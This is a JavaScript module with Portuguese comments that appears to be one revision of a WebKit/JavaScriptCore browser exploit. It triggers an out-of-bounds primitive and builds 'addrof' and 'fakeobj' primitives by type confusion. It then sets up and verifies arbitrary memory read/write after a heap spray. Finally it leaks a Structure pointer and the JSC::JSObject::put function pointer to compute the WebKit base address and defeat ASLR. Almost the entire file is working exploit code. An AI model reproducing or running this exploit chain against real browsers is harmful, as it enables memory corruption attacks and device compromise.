// js/script3/testArrayBufferVictimCrash.mjs (v102 - R62 com Correção de Contaminação de Heap)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Corrigido um problema crítico de contaminação de estado onde a primitiva de L/E continuava
// lendo valores do teste de verificação. Adicionado um reset de estado explícito após a
// Fase 4 e uma verificação de erro para garantir que os ponteiros lidos na Fase 5 são reais.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// Nome do módulo atualizado para refletir a correção
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v102_R62_Fix";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (COM CORREÇÃO DE ESTADO)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Correção de Contaminação de Heap ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou.",
        webkit_base_addr: null
    };

    try {
        // --- FASES 1-3: Configuração das Primitivas ---
        logS3("--- FASES 1-3: Obtendo primitivas OOB e L/E... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        const leaker = { obj_prop: null, val_prop: 0 };
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };
        const arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas 'addrof', 'fakeobj', e L/E autocontida estão prontas.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({ a: i, b: 0xCAFEBABE });
        }
        const test_obj = spray[500];
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr = addrof(test_obj);
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr = test_obj_addr.add(0x10);

        logS3(`(Verificação) Escrevendo ${value_to_write.toString(true)} no endereço ${prop_a_addr.toString(true)}...`, "info");
        arb_write_final(prop_a_addr, value_to_write);

        const value_read = arb_read_final(prop_a_addr);
        logS3(`(Verificação) Valor lido de volta: ${value_read.toString(true)}`, "leak");

        if (!value_read.equals(value_to_write)) {
            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
        }
        logS3("VERIFICAÇÃO DE L/E COMPLETA: Leitura/Escrita arbitrária é 100% funcional.", "vuln");

        // NOVO: Reset de Estado Pós-Verificação
        // Esta é a correção crucial. Resetamos o obj_prop do leaker para null,
        // forçando a primitiva a criar um novo 'fakeobj' na próxima chamada, em vez de
        // reutilizar o antigo que apontava para o local do teste.
        logS3("--- CORREÇÃO: Resetando o estado da primitiva de L/E para evitar contaminação... ---", "info");
        leaker.obj_prop = null;

        // --- FASE 5: Vazamento do Endereço Base da WebKit ---
        logS3("--- FASE 5: Vazamento do Endereço Base da WebKit (com memória limpa) ---", "subtest");

        // 1. Usamos um objeto diferente do spray para garantir que não haja sobreposição.
        const leak_target_obj = { f: 0xDEADBEEF };
        const leak_target_addr = addrof(leak_target_obj);
        logS3(`[Etapa 1] Endereço do objeto alvo (leak_target_obj): ${leak_target_addr.toString(true)}`, "info");

        // 2. Ler o ponteiro para a Estrutura (Structure) do objeto.
        const structure_addr_ptr = leak_target_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
        const structure_addr = arb_read_final(structure_addr_ptr);
        logS3(`[Etapa 2] Lendo do endereço ${structure_addr_ptr.toString(true)} para obter o ponteiro da Estrutura...`, "debug");
        logS3(`[Etapa 2] Endereço da Estrutura (Structure) do objeto: ${structure_addr.toString(true)}`, "leak");

        // ADICIONADO: Verificação de Contaminação
        if (structure_addr.equals(value_to_write)) {
            throw new Error("FALHA CRÍTICA: Contaminação do heap detectada! A primitiva de L/E ainda está lendo o valor de teste em vez da memória real. O reset falhou.");
        }
        if(structure_addr.low() === 0 && structure_addr.high() === 0) throw new Error("Ponteiro da Estrutura é NULO.");

        // 3. Ler o ponteiro da função virtual 'put' de dentro da Estrutura.
        const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
        const jsobject_put_addr = arb_read_final(vfunc_put_ptr_addr);
        logS3(`[Etapa 3] Lendo do endereço ${vfunc_put_ptr_addr.toString(true)} (Structure + 0x18) para obter o ponteiro da vfunc...`, "debug");
        logS3(`[Etapa 3] Endereço vazado da função (JSC::JSObject::put): ${jsobject_put_addr.toString(true)}`, "leak");
        if(jsobject_put_addr.low() === 0 && jsobject_put_addr.high() === 0) throw new Error("Ponteiro da função JSC::JSObject::put é NULO.");


        // 4. Calcular o endereço base da WebKit.
        const jsobject_put_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]);
        logS3(`[Etapa 4] Offset conhecido de JSC::JSObject::put: ${jsobject_put_offset.toString(true)}`, "info");

        const webkit_base_addr = jsobject_put_addr.sub(jsobject_put_offset);
        final_result.webkit_base_addr = webkit_base_addr.toString(true);

        logS3(`++++++++++++ SUCESSO! ENDEREÇO BASE DA WEBKIT CALCULADO ++++++++++++`, "vuln");
        logS3(`   ENDEREÇO BASE: ${final_result.webkit_base_addr}`, "vuln");

        final_result.success = true;
        final_result.message = `Vazamento da base da WebKit bem-sucedido. Base encontrada em: ${final_result.webkit_base_addr}.`;

    } catch (e) {
        final_result.success = false;
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    // Estrutura de retorno permanece a mesma
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: {
            success: !!final_result.webkit_base_addr,
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_addr
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Corrected)' }
    };
}
